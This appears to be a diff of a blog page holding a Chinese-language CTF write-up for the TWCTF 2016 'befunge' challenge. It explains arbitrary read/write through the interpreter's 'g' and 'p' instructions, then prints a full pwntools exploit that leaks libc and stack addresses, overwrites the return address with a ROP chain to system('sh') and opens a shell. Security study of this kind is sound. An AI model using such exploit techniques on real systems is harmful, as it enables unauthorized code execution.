class="line">			.....<span class="comment">//other instruction...</span></span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;g&#x27;</span>: <span class="comment">// (get) Pop x and y, then push ASCII value of the character at that position in the program</span></span><br><span class="line">				x = pop();</span><br><span class="line">				y = pop();</span><br><span class="line">				push( (<span class="type">char</span>)(program[<span class="number">80</span> * x + y]) );</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>: <span class="comment">// (put) Pop x, y, and z, then change the character at (x,y) in the program to the character with ASCII value z</span></span><br><span class="line">				x = pop();</span><br><span class="line">				y = pop();</span><br><span class="line">				z = pop();</span><br><span class="line">				program[<span class="number">80</span> * x + y] = (<span class="type">char</span>)z;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>: <span class="comment">// space = do nothing</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		--step;</span><br><span class="line">		<span class="comment">// update row &amp; column</span></span><br><span class="line">		<span class="comment">// do other stuff...</span></span><br><span class="line">	&#125;<span class="keyword">while</span> ( step );</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Too many steps. Is there any infinite loops?&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>pseudo code 將一些比較重要的功能都列在上面了。  </p>
+<p>透過觀察程式的行為，我們不難發現:  </p>
+<ul>
+<li>利用 <code>&amp;</code>, <code>g</code> 和 <code>.</code> 的功能，我們有辦法做到<strong>任意讀</strong>。<ul>
+<li>先透過 <code>&amp;</code> 將 <code>x</code> 跟 <code>y</code> push 到 Stack 上<ul>
+<li><code>x</code> 與 <code>y</code> 我們可控(32 bit integer)</li>
+<li>這邊注意 Stack (大寫S) 是程式在 bss 段自行模擬出來的一塊，擁有類似 stack 行為的記憶體區塊，並不是指程式真正的 stack。</li>
+</ul>
+</li>
+<li><code>g</code> 的功能是將 <code>program[80 * x + y]</code> 的內容 push 至 Stack 上。因為<code>x</code> 與 <code>y</code> 我們可控，代表著我們可以將任意位址的內容 push 到 Stack 上。</li>
+<li><code>.</code> 會將 Stack 頂端的值(可控) pop 出來 (1 byte)，並印出他的數值。</li>
+</ul>
+</li>
+<li>利用 <code>&amp;</code> 和 <code>p</code> 的功能，我們還有辦法做到<strong>任意寫</strong><ul>
+<li>先透過 <code>&amp;</code> 將 <code>x</code>, <code>y</code>與 <code>z</code> push 到 Stack 上</li>
+<li><code>p</code> 功能會先從 Stack pop 出 3 個值 (<code>x</code>, <code>y</code>, <code>z</code>，均可控)，之後將 z 的值放入 <code>program[80 * x + y]</code> (即<code>program[80 * x + y] = z</code>)。</li>
+</ul>
+</li>
+<li>還有一點要注意  <ul>
+<li>因為透過 <code>&amp;</code> 功能將數值 push 進 Stack 時，一次只能 push 一個 integer (32 bit)。如果我們想要使 <code>program[80 * x + y]</code> 跳到很遠的地方，<code>x</code> 與 <code>y</code> 很有可能會需要是一個超過 integer 範圍的數值，如此一來使用 <code>&amp;</code>功能將無法滿足我們的需求。</li>
+<li>解決方法，是利用 <code>*</code> 功能。<code>*</code> 會從 Stack 頂端 pop 出兩個數值 <code>x</code>與<code>y</code>，並將 <code>x * y</code> 的結果 push 回 Stack 上。這裡全程是使用 64 bit register 進行操作，所以不會有 integer 32 bit 的問題。</li>
+<li>因此，先透過<code>*</code>功能將 Stack 頂端變成一個 long integer，之後我們就可以利用上面的方法<strong>對任意位址做任意讀寫。</strong></li>
+</ul>
+</li>
+</ul>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>現在我們知道洞在哪了，也知道該怎麼利用這個漏洞進行任意位址的讀寫操作。因為這題有DEP無法執行 shellcode，因此首要的任務是要去 leak libc 的 address，我們才有辦法知道 <code>system</code> 的位址，進而執行 <code>system(&#39;sh&#39;)</code> 拿 shell。  </p>
+<p>而要 leak libc 的 address 其實不難。這題雖然 GOT 不能寫，但還是可以讀，因此我們可以透過任意讀的漏洞來 leak GOT，獲得 libc 的 address。這裡我是去 leak <code>__libc_start_main</code> 的 GOT，並透過 <a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">libc-database</a> 來獲取遠端 libc 的版本以及相關的 offset。  </p>
+<p>現在我們有了 libc 的 address，該跳 system 了。問題是該怎麼跳呢?這題沒有 function pointer， GOT 與 fini array 都是唯讀，我們無法透過 overwrite function pointer 或是 GOT hijacking 的方式來 exploit。<strong>唯一的辦法，就是去 overwrite return address</strong>。  </p>
+<p>問題來了: 要 overwrite return address，首先我們必須知道 stack 的位址，因此我們必須要有辦法先 leak stack address。而要 leak stack address，有以下幾種方式:  </p>
+<ul>
+<li><strong>leak stack 上的 saved rbp 或是 argv</strong>。這部份通常是用在 format string 的漏洞，這題無法這樣做。  </li>
+<li><strong>leak tls section 上的 stack address</strong>。這部份比較進階，簡單來說就是程式在執行的時候，會有個 memory 的區塊叫做 tls section，裡面會存許多有用的東西，像是 stack canary, main_arena 的 address, 以及一個不知道指向哪裡的 stack address。而要透過這種方式 leak stack address，我們必須要有辦法知道 tls section 的位址，而這通常需要透過程式先呼叫 mmap，之後 leak mmap 出來的 memory address 來達成。這題因為沒有 malloc 或是 mmap，所以也無法透過這樣的方式來 leak stack address。  </li>
+<li><strong>leak ld-linux.so 的 __libc_stack_end symbol</strong>。如果我們有辦法知道 ld-linux.so 的位址以及版本，我們可以透過 leak 裡面的 <code>__libc_stack_end</code> 這個 symbol，來獲取 stack address。這題用這種方式理論上辦的到，我自己就是用這種方式 leak 的，只是做起來非常麻煩。解完這題之後，經詢問別人才發現原來還有第四種方式。  </li>
+<li><strong>leak libc 裡面的 environ symbol</strong>。經過 pwn queen meh 的提點，才知道原來 libc 裡面有個 symbol 叫做 <code>environ</code>，裡面會存 stack address。因此這題比較漂亮的方式，是 leak libc 的 address 之後，直接 leak <code>libc.symbols[&#39;environ&#39;]</code> 來獲取 stack address。</li>
+</ul>
+<p>不過當時的我還是採取了第三種，也就是先 leak ld-linux.so，再 leak <code>__libc_stack_end</code> 的方式來獲取 stack address。ld-linux.so 的版本是直接用 libc 版本去猜。至於 leak ld-linux.so 的位址有幾種方式:  </p>
+<ul>
+<li>leak <code>dl_resolve</code> 的GOT。<code>dl_resolve</code> 位於 <code>ld-linux.so</code> 裡面，而它的 GOT 通常位於 GOT[2] ( 第三個 GOT entry ) 這個位置，因此如果有辦法 leak <code>dl_resolve</code> 的 GOT， 可以直接獲得 ld-linux.so 的位址。但是這題因為是 FULL RELRO 的關係，因此 GOT[2] 的位址是空的 ( 因為function 已經 bind 好了不需要做 runtime resolve )， 無法利用這樣的方式來 leak。</li>
+<li>leak DT_DEBUG 的 info。這部份請參考<a target="_blank" rel="noopener" href="http://rk700.github.io/article/2015/04/09/dt_debug-read">這個連結</a>。簡而言之，這題用這種方式是可行的 ( 有辦法 leak 到 ld-linux.so )。</li>
+</ul>
+<p>因此總結這題的 exploit 方法:  </p>
+<ul>
+<li>先透過任意讀的漏洞 leak libc 的 address</li>
+<li>(錯誤解法) 透過任意讀的漏洞 leak ld-linux.so 的 address，再 leak <code>__libc_stack_end</code> 來獲得 stack address  </li>
+<li>(正確解法) 直接 leak libc 的 <code>environ</code> symbol 來獲取 stack address</li>
+<li>透過任意寫的漏洞，overwrite return address<ul>
+<li>可透過 pop_rdi –&gt; bin_sh 字串 –&gt; system 的方式做 ROP 來拿 shell</li>
+</ul>
+</li>
+</ul>
+<p>final exploit ( leak ld-linux.so的版本 ) :</p>
+<figure class="highlight python"><figcaption><span>exp_bef.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;pwn1.chal.ctf.westerns.tokyo&quot;</span> </span><br><span class="line">PORT = <span class="number">62839</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./befunge_patch&quot;</span></span><br><span class="line">LIBC_PATH = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myexec</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_addr</span>(<span class="params">s, f</span>): <span class="comment"># search string address in file</span></span><br><span class="line">    result = <span class="built_in">list</span>(f.search(s+<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(result): <span class="comment"># no result</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_one_byte</span>(<span class="params">off_1, off_80</span>):</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(off_1))</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(off_80))</span><br><span class="line">    ret = r.recvuntil(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>(<span class="params">base, off_80, name=<span class="literal">None</span></span>):</span><br><span class="line">    ret_addr = <span class="number">0</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(base, base+<span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;leaking %s byte : %d&quot;</span> % (name, cnt+<span class="number">1</span>)</span><br><span class="line">        ret = leak_one_byte(i, off_80)</span><br><span class="line">        ret_addr = ret_addr | ((ret&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>*cnt)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal_offset</span>(<span class="params">addr, text_base</span>):</span><br><span class="line">    start_from = text_base + <span class="number">0x202040</span></span><br><span class="line">    offset = addr - start_from</span><br><span class="line">    off_80 = offset/<span class="number">80</span></span><br><span class="line">    off_1 = offset%<span class="number">80</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> off_1, off_80</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_far_addr</span>(<span class="params">addr, text_base, name</span>):</span><br><span class="line">    ret_addr = <span class="number">0</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    off_1, off_80 = cal_offset(addr, text_base)</span><br><span class="line">    temp = <span class="built_in">int</span>(math.sqrt(off_80))</span><br><span class="line">    off_1 = (off_80 - temp**<span class="number">2</span>)*<span class="number">80</span> + off_1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(off_1, off_1+<span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;leaking %s byte : %d&quot;</span> % (name, cnt+<span class="number">1</span>)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        ret = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot; &quot;</span>))</span><br><span class="line">        ret_addr = ret_addr | ((ret&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>*cnt)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_far_addr</span>(<span class="params">addr, text_base, name, value</span>):</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    off_1, off_80 = cal_offset(addr, text_base)</span><br><span class="line">    temp = <span class="built_in">int</span>(math.sqrt(off_80))</span><br><span class="line">    off_1 = (off_80 - temp**<span class="number">2</span>)*<span class="number">80</span> + off_1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(off_1, off_1+<span class="number">6</span>):</span><br><span class="line">        v = (value&gt;&gt;(<span class="number">8</span>*cnt)) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;writing %s byte %d : %x&quot;</span> % (name, cnt+<span class="number">1</span>, v)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(v))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(temp))</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#LOCAL = True</span></span><br><span class="line">    LOCAL = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># construct befunge-93 program</span></span><br><span class="line">    preline = myexec(<span class="string">&quot;wc -l ./bbb | awk &#x27;&#123;print $1&#125;&#x27;&quot;</span>)</span><br><span class="line">    preline = <span class="built_in">int</span>(preline)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./bbb&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    s = f.read()</span><br><span class="line">    s += <span class="string">&quot;\n&quot;</span>*(<span class="number">80</span>-preline)</span><br><span class="line">    </span><br><span class="line">    r, LD = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> LOCAL:</span><br><span class="line">        r = remote(HOST, PORT)</span><br><span class="line">        LD = ELF(<span class="string">&quot;/mnt/files/ld-linux-x86-64.so.2&quot;</span>) <span class="comment"># ubuntu 14.04 64 bit ld-linux</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(ELF_PATH)</span><br><span class="line">        LD = ELF(<span class="string">&quot;/lib64/ld-linux-x86-64.so.2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># send program</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, s)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    libc_main = leak_addr(-<span class="number">48</span>, -<span class="number">2</span>, <span class="string">&quot;libc_main&quot;</span>)</span><br><span class="line">    libc_base, system, bin_sh = <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="comment"># for local</span></span><br><span class="line">    <span class="keyword">if</span> LOCAL:</span><br><span class="line">        libc.address += libc_main - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">        libc_base = libc.address</span><br><span class="line">        system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        bin_sh = str_addr(<span class="string">&quot;sh\x00&quot;</span>, libc)</span><br><span class="line">    <span class="comment"># for remote</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        libc_base = libc_main - <span class="number">0x21e50</span></span><br><span class="line">        system = libc_base + <span class="number">0x0000000000046590</span></span><br><span class="line">        bin_sh = libc_base + <span class="number">0x17c8c3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak text base</span></span><br><span class="line">    text_base = leak_addr(-<span class="number">56</span>, -<span class="number">9</span>, <span class="string">&quot;text_base&quot;</span>)</span><br><span class="line">    text_base -= <span class="number">0xb00</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.info(<span class="string">&quot;text_base: &quot;</span>+<span class="built_in">hex</span>(text_base))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># leak r_debug</span></span><br><span class="line">    r_debug = leak_addr(<span class="number">0</span>, -<span class="number">7</span>, <span class="string">&quot;r_debug&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;r_debug: &quot;</span>+<span class="built_in">hex</span>(r_debug))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># traverse link_map structure &amp; leak ld-linux.so base address</span></span><br><span class="line">    link_map_addr = r_debug + <span class="number">8</span></span><br><span class="line">    link_map_text = leak_far_addr(link_map_addr, text_base, <span class="string">&quot;link_map_text&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_text: &quot;</span>+<span class="built_in">hex</span>(link_map_text))</span><br><span class="line">    link_map_vdso = leak_far_addr(link_map_text+<span class="number">24</span>, text_base, <span class="string">&quot;link_map_vdso&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_vdso: &quot;</span>+<span class="built_in">hex</span>(link_map_vdso))</span><br><span class="line">    link_map_libc = leak_far_addr(link_map_vdso+<span class="number">24</span>, text_base, <span class="string">&quot;link_map_libc&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_libc: &quot;</span>+<span class="built_in">hex</span>(link_map_libc))</span><br><span class="line">    link_map_ld = leak_far_addr(link_map_libc+<span class="number">24</span>, text_base, <span class="string">&quot;link_map_ld&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;link_map_ld: &quot;</span>+<span class="built_in">hex</span>(link_map_ld))</span><br><span class="line">    ld_base = leak_far_addr(link_map_ld, text_base, <span class="string">&quot;ld_base&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;ld_base: &quot;</span>+<span class="built_in">hex</span>(ld_base))</span><br><span class="line">    <span class="comment"># leak __libc_stack_end in ld-linux.so, get stack address</span></span><br><span class="line">    LD.address += ld_base</span><br><span class="line">    log.info(<span class="string">&quot;libc_stack_end: &quot;</span>+<span class="built_in">hex</span>(LD.symbols[<span class="string">&#x27;__libc_stack_end&#x27;</span>]))</span><br><span class="line">    stack_addr = leak_far_addr(LD.symbols[<span class="string">&#x27;__libc_stack_end&#x27;</span>], text_base, <span class="string">&quot;stack addr&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;stack_addr: &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">    </span><br><span class="line">    pop_rdi = text_base + <span class="number">0x000000000000120c</span></span><br><span class="line">    ret_addr = stack_addr - <span class="number">216</span></span><br><span class="line">    log.info(<span class="string">&quot;ret_addr: &quot;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">    log.info(<span class="string">&quot;pop_rdi: &quot;</span>+<span class="built_in">hex</span>(pop_rdi))</span><br><span class="line">    log.info(<span class="string">&quot;bin_sh: &quot;</span>+<span class="built_in">hex</span>(bin_sh))</span><br><span class="line">    log.info(<span class="string">&quot;system: &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite return address</span></span><br><span class="line">    write_far_addr(ret_addr, text_base, <span class="string">&quot;ret_addr&quot;</span>, pop_rdi)</span><br><span class="line">    write_far_addr(ret_addr+<span class="number">8</span>, text_base, <span class="string">&quot;ret_addr+8&quot;</span>, bin_sh)</span><br><span class="line">    write_far_addr(ret_addr+<span class="number">16</span>, text_base, <span class="string">&quot;ret_addr+16&quot;</span>, system)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
+<p><code>bbb</code> 這個檔案是要給程式的 Befunge-93 instruction:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;                                    v</span><br><span class="line">v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt;</span><br><span class="line">&gt;&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.&amp;&amp;g.            v</span><br><span class="line">v.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;.g&amp;&amp;            &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.&amp;&amp;&amp;*g.v </span><br><span class="line">v                                    &lt;</span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv</span><br><span class="line">v                                    &lt; </span><br><span class="line">&gt;                                    ^</span><br></pre></td></tr></table></figure>
+<p>可以看到最後有個無限迴圈，為的是要讓程式執行到最後跳出 do-while 迴圈，之後跑到 main 的結尾來做 ret，接上我們的 ROP chain。</p>
+<p>跑起來大概長的像這樣:</p>
+<pre>
+leaking libc_main byte : 1
+leaking libc_main byte : 2
+leaking libc_main byte : 3
+................
+writing ret_addr+16 byte 5 : b4
+writing ret_addr+16 byte 6 : 7f
+[*] Switching to interactive mode
+Too many steps. Is there any infinite loops?
+// ls
+befunge
+flag
+// cat flag
+TWCTF{It_1s_eMerG3nCy}
+[*] Closed connection to pwn1.chal.ctf.westerns.tokyo port 62839
+</pre>  
+<p>flag: <code>TWCTF&#123;It_1s_eMerG3nCy&#125;</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/MMA-CTF-2nd-2016-Get-the-admin-password-100/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2996,667 +3736,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/2016-08-13-docker-and-containerization/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
